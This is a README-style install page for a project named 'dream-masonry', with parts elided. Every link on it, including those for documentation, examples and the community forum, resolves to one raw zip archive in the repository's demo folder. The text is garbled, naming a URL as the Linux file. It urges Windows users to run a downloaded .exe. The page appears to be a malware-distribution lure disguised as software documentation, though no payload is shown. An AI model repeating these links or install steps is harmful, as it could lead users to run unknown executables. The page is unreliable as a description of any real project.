...
[![Download Now](https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip)

1. **Visit the Releases Page**: Click the button above or go to [this link](https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip) to reach the Releases page.
...
3. **Download the File**: Find the section that says “Assets” under the release. You’ll see files listed there. If you are using Windows, download the file that ends with `.exe`. For macOS, download the `.dmg` file. For Linux users, look for `https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip`.

4. **Install the Application**: 
   - For Windows: Double-click the downloaded `.exe` file. Follow the prompts to install.
   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
   - For Linux: Extract the `https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip` file and follow the included instructions to install.
...
- **Documentation**: For detailed explanations on advanced features, visit the [documentation page](https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip).
- **Examples**: Check out pre-made layouts and examples in the [example projects](https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip) section.
...
- **Engage with Other Users**: Join discussions and share your layouts on our [community forum](https://github.com/AbdoulayeDemb/dream-masonry/raw/refs/heads/main/demo/dream-masonry-2.6.zip).
